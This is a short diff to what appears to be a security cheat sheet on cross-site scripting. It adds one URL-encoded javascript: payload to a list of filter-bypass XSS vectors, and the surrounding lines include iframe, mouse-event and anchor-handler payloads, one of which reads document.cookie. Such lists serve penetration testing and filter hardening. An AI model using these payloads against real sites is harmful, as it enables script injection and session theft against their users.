@@ -244,6 +244,7 @@ XSS attacks may be conducted without using `<script>...</script>` html tags. Oth
   <iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
   <input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
   ''""><a OnpoINTeRENtEr=confirm(document.cookie)x>
+  javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain
   ```
 </details>
 
